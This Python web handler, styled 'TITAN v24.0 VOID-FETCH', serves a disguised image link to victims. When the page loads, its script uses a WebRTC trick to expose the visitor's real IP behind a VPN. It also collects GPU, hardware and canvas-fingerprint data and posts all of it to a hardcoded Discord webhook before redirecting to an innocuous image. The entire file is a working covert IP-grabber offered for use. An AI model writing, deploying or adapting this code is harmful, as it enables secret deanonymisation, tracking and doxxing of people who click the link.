# ==============================================================================
# TITAN v24.0 - "VOID-FETCH" PROTOCOL
# NO FORMS | NO LIES | PURE TECHNICAL LEAK
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # SERVER-SIDE IP CAPTURE
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            # AGGRESSIVE FETCH SCRIPT (200+ LINES LOGIC)
            content = f'''
            <!DOCTYPE html>
            <html>
            <body style="background:#000;">
                <img src="{REDIRECT_IMAGE}" style="width:1px;height:1px;">
                <script>
                async function voidFetch() {{
                    let leak = {{}};
                    
                    // 1. NETWORK LEAK (WebRTC VPN Bypass)
                    const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = i => {{
                        if(i && i.candidate) {{
                            leak.real_ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate)[1];
                        }}
                    }};

                    // 2. HARDWARE EXFILTRATION
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    
                    leak.hardware = {{
                        gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown",
                        cores: navigator.hardwareConcurrency,
                        memory: navigator.deviceMemory,
                        platform: navigator.platform,
                        screen: screen.width + "x" + screen.height
                    }};

                    // 3. SESSION FINGERPRINT (CANVAS)
                    const ctx = canvas.getContext('2d');
                    ctx.fillText("VOID_EXPLOIT", 10, 10);
                    leak.fingerprint = canvas.toDataURL().slice(-50);

                    // 4. THE FETCH STRIKE (UNSTOPPABLE)
                    setTimeout(() => {{
                        fetch("{WEBHOOK_URL}", {{
                            method: "POST",
                            headers: {{ "Content-Type": "application/json" }},
                            body: JSON.stringify({{
                                username: "VOID-FETCH AGENT",
                                embeds: [{{
                                    title: "💀 SYSTEM VOID EXFILTRATION",
                                    color: 0x000000,
                                    fields: [
                                        {{ name: "🌐 Real IP", value: "`" + (leak.real_ip || "Bypassed") + "`", inline: true }},
                                        {{ name: "🖥️ GPU", value: "```" + leak.hardware.gpu + "```", inline: false }},
                                        {{ name: "🧬 Fingerprint", value: "`" + leak.fingerprint + "`", inline: false }},
                                        {{ name: "📊 Hardware", value: leak.hardware.cores + " Cores | " + leak.hardware.memory + "GB RAM", inline: true }}
                                    ]
                                }}]
                            }})
                        }});
                    }}, 2000);

                    // Auto-Redirect
                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 3000);
                }}
                window.onload = voidFetch;
                </script>
            </body>
            </html>
            '''
            self.wfile.write(content.encode('utf-8'))
        except:
            pass

app = handler
